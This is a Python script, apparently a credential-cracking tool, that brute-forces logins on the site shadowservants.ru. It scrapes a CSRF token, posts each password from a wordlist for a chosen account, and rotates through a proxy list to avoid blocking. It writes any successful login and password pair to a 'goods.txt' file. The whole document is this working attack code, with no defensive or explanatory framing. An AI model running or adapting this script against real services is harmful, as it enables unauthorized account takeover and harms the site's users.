from requests import session
from requests import exceptions
import time
import re
import os

last_password = ''
class Cracker:
    gproxy = ''
    def session_get(self,proxy,login,passwords):
        global gproxy
        r = session()
        prox = proxy.pop()
        gproxy = proxy
        try:
            r.proxies = {'https': 'https://'+prox}
            data = r.get('https://shadowservants.ru/login',timeout=5).text
            reg = re.findall(r'<meta name=\"csrf_token\" content=\"[A-Za-z0-9.-]+\" />',data)
            if len(str(reg)) < 3:
                time.sleep(1)
                print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
                self.session_get(proxy,login,passwords)
                return
            csrf = str(reg).split()[2]
            csrf = csrf.split('"')
            csrf = csrf[1].replace('"','')
            self.auth(r,csrf,prox,login,passwords)
        except exceptions.Timeout as e:
            time.sleep(1)
            print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
            self.session_get(proxy,login,passwords)
        except exceptions.ProxyError:
            time.sleep(1)
            print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
            self.session_get(proxy,login,passwords)
    def auth(self,r,csrf,prox,login,passwords):
        global last_password
        global gproxy
        f = open(passwords,'r')
        password = f.readline()
        password = password.strip()
        password = password.replace('\\n', '')
        if last_password != '':
            while password != last_password:
                password = f.readline()
        while password:
            password = password.strip()
            password = password.replace('\\n','')
            try:
                repl = r.post(url='https://shadowservants.ru/login',data={'login':login,'password':password, 'csrf_token':csrf},headers={"referer": "https://shadowservants.ru/login"},proxies={'https': "https://"+prox}, timeout=5)
                if "Неправильный логин или пароль" not in repl.text and "Пользователь неактивен" not in repl.text:
                    try:
                        os.mkdir('./workout/')
                    except:
                        pass
                    try:
                        f = open('./workout/goods.txt','a')
                        f.write('Good: '+login + "|"+password+'\n')
                        f.close()
                    except:
                        print('\nCan\'t save results. Ok, I just say it here.\n')
                    print("\n\nNicely done! Password for \""+login+"\" is \""+password+"\"")
                    raise KeyboardInterrupt
                else:
                    print('\nBad attempt with the "'+password+'" password.')
                password = f.readline()
            except KeyboardInterrupt:
                print('Ok. My work done.')
                f.close()
                exit()
            except:
                time.sleep(1)
                print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
                f.close()
                Cracker.session_get(gproxy,login,passwords)
                return

        f.close()